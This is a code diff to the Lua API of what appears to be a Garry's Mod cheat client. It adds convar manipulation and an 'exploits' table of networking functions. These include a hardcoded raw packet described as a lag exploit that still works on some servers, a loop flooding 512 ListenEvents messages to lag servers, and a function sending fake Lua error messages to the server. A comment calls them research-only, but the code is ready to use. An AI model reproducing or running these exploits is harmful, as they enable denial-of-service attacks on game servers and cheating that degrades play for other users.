@@ -91,13 +91,6 @@ namespace lua_api {
 		return 1;
 	}
 
-	LUA_FUNCTION(in_screenshot)
-	{
-		LUA->PushBool(globals::lua::api::in_screenshot); // doesnt' seem to work?
-
-		return 1;
-	}
-
 	LUA_FUNCTION(is_in_game)
 	{
 		LUA->PushBool(EngineClient->IsInGame());
@@ -146,6 +139,46 @@ namespace lua_api {
 		return 0;
 	}
 
+	LUA_FUNCTION(get_convar)
+	{
+		LUA->CheckString(1);
+
+		ConVar* cvar = CVar->FindVar(LUA->GetString(1));
+
+		LUA->CreateTable();
+		{
+			LUA->PushString(cvar->GetName());
+			LUA->SetField(-2, "name");
+
+			LUA->PushNumber(static_cast<double>(cvar->fVal));
+			LUA->SetField(-2, "value");
+		}
+
+		return 1;
+	}
+
+	LUA_FUNCTION(set_convar)
+	{
+		LUA->CheckString(1);
+		LUA->CheckNumber(2);
+
+		ConVar* cvar = CVar->FindVar(LUA->GetString(1));
+		cvar->SetValue(LUA->GetNumber(2));
+
+		return 0;
+	}
+
+	LUA_FUNCTION(set_convar_string)
+	{
+		LUA->CheckString(1);
+		LUA->CheckString(2);
+
+		ConVar* cvar = CVar->FindVar(LUA->GetString(1));
+		cvar->ChangeStringValue(LUA->GetString(2), cvar->fVal);
+
+		return 0;
+	}
+
 	LUA_FUNCTION(change_name)
 	{
 		LUA->CheckString(1);
@@ -179,7 +212,6 @@ namespace lua_api {
 		bf_write write;
 		write.StartWriting(packet, sizeof(packet));
 		write.WriteUInt(static_cast<uint32_t>(NetMessage::net_Disconnect), NET_MESSAGE_BITS);
-		write.WriteByte(1);
 		write.WriteString(reason);
 
 		netchannel->SendData(&write, true);
@@ -224,7 +256,7 @@ namespace lua_api {
 		bf_write write;
 		write.StartWriting(packet, sizeof(packet));
 		write.WriteUInt(static_cast<uint32_t>(NetMessage::clc_CmdKeyValues), NET_MESSAGE_BITS);
-		write.WriteLong(LUA->GetNumber(1));
+		write.WriteLong(21);
 		write.WriteSignedInt(LUA->GetNumber(2), 16);
 
 		for (int i = 0; i < sizeof(data) / sizeof(int); i++)
@@ -265,10 +297,66 @@ namespace lua_api {
 		return 0;
 	}
 
-	// FIXME: i don't know why it doesn't work
-	//		  and i don't want to deal with it now
-	// 
-	// 11:40 PM / 19.02.2024 / shockpast
+	LUA_FUNCTION(exploit_srv_message)
+	{
+		LUA->CheckString(1);
+		
+		const char* message = LUA->GetString(1);
+
+		CNetChan* netchannel = EngineClient->GetNetChannelInfo();
+		static uint8_t packet[256 + 2 + sizeof(message)];
+
+		bf_write write;
+		write.StartWriting(packet, sizeof(packet));
+		write.WriteUInt(static_cast<uint32_t>(NetMessage::clc_GMod_ClientToServer), NET_MESSAGE_BITS);
+		write.WriteUInt(sizeof(&message) / sizeof(char), 20);
+		write.WriteByte(2);
+		write.WriteString(message);
+
+		netchannel->SendData(&write, true);
+
+		return 0;
+	}
+
+	// https://www.mpgh.net/forum/showthread.php?t=1424274
+	// still works lol?
+	// fixed on https://physgun.com by their own AC (ID 4242)
+	LUA_FUNCTION(exploit_clientinfo)
+	{
+		const char* data = "\x48\x00\x00\x00\xc0\xd7\x8d\x72\x38\x00\x00\x00\x00\x80\xd1\xc1\xb1\xa1\xa5\x85\x65\x45\x4f\x0f\xcf\x8e\xa6\x26\xa6\x25\x05";
+
+		CNetChan* netchannel = EngineClient->GetNetChannelInfo();
+
+		bf_write write;
+		write.m_pData = (uint32_t*)"\x48\x00\x00\x00\xc0\xd7\x8d\x72\x38\x00\x00\x00\x00\x80\xd1\xc1\xb1\xa1\xa5\x85\x65\x45\x4f\x0f\xcf\x8e\xa6\x26\xa6\x25\x05";
+		write.m_nDataBits = 243;
+		write.m_nDataBytes = 31;
+		write.m_iCurBit = 243;
+
+		netchannel->SendData(&write, true);
+
+		return 0;
+	}
+
+	LUA_FUNCTION(exploit_listenevents)
+	{
+		CNetChan* netchannel = EngineClient->GetNetChannelInfo();
+
+		for (int i = 0; i < 512; ++i)
+		{
+			static uint8_t packet[256 + 2 + sizeof(i)];
+
+			bf_write write;
+			write.StartWriting(packet, sizeof(packet));
+			write.WriteUInt(static_cast<uint32_t>(NetMessage::clc_ListenEvents), NET_MESSAGE_BITS);
+			write.WriteUInt(i, 32);
+			
+			netchannel->SendData(&write, true);
+		}
+
+		return 0;
+	}
+
 	LUA_FUNCTION(load_script)
 	{
 		LUA->CheckString(1);
@@ -285,7 +373,7 @@ namespace lua_api {
 
 		std::ifstream file(rootPath.c_str());
 		std::string content((std::istreambuf_iterator<char>(file)),
-							(std::istreambuf_iterator<char>()));
+			(std::istreambuf_iterator<char>()));
 		if (content.length() <= 0)
 		{
 			logger::AddLog("[warning] %s is empty!", fileName);
@@ -294,7 +382,7 @@ namespace lua_api {
 
 		try
 		{
-			std::thread(RunScript, content).detach();
+			std::thread(RunScript, content).join();
 		}
 		catch (std::exception& e)
 		{
@@ -333,6 +421,8 @@ namespace lua_api {
 			Lua->PushCFunction(is_in_game);
 			Lua->SetField(-2, "is_in_game");
 
+			// loads external script from
+			// C:/asuna/lua/*.lua
 			Lua->PushCFunction(load_script);
 			Lua->SetField(-2, "load_script");
 
@@ -402,7 +492,9 @@ namespace lua_api {
 				}
 				Lua->SetField(-2, "player_info_s");
 
-				//
+				// exploits that could somehow interact with server's fps
+				// use for research purposes only, it was not intended
+				// to harm any servers anyhow using these functions
 				Lua->CreateTable();
 				{
 					// lags client movement, only visual (uneffective)
@@ -414,11 +506,31 @@ namespace lua_api {
 					Lua->PushCFunction(exploit_achievement);
 					Lua->SetField(-2, "achievement");
 
+					// requests file from server
+					// technically you could request any,
+					// but for some reason it's only current map file
 					Lua->PushCFunction(exploit_request_file);
 					Lua->SetField(-2, "request_file");
 
+					// tries to send file to server if sv_allowupload 1
+					// but it (server) denies and it could be used for lag exploits?
 					Lua->PushCFunction(exploit_send_file);
 					Lua->SetField(-2, "send_file");
+
+					// not an actual exploit
+					// sends an Lua Error to server with any message in first argument
+					Lua->PushCFunction(exploit_srv_message);
+					Lua->SetField(-2, "srv_message");
+
+					// lag exploit from ~2019 year that still works on some servers
+					// PhysgunAC fixed this with ID: 4242
+					Lua->PushCFunction(exploit_clientinfo);
+					Lua->SetField(-2, "clientinfo");
+
+					// another "exploit" that spams into network
+					// and maaaaybe should lag the server
+					Lua->PushCFunction(exploit_listenevents);
+					Lua->SetField(-2, "listenevents");
 				}
 				Lua->SetField(-2, "exploits");
 
@@ -429,11 +541,6 @@ namespace lua_api {
 				// simple get latency
 				Lua->PushCFunction(get_latency);
 				Lua->SetField(-2, "get_latency"); // requires flow to be known
-
-				// returns true if current frame inside
-				// 'render.Capture' or has screenshot
-				Lua->PushCFunction(in_screenshot); // always returns false
-				Lua->SetField(-2, "in_screenshot");
 
 				// changes name thru netchannel programatically
 				Lua->PushCFunction(change_name);
@@ -454,6 +561,18 @@ namespace lua_api {
 				// sets (x, y) for viewangles of localplayer
 				Lua->PushCFunction(set_view_angles);
 				Lua->SetField(-2, "set_view_angles");
+
+				// getter for convars
+				Lua->PushCFunction(get_convar);
+				Lua->SetField(-2, "get_convar");
+
+				// setter for convars
+				Lua->PushCFunction(set_convar);
+				Lua->SetField(-2, "set_convar");
+
+				// setter for convars but that has string as value
+				Lua->PushCFunction(set_convar_string);
+				Lua->SetField(-2, "set_convar_string");
 			}
 		}
 		Lua->SetField(-2, "asuna");
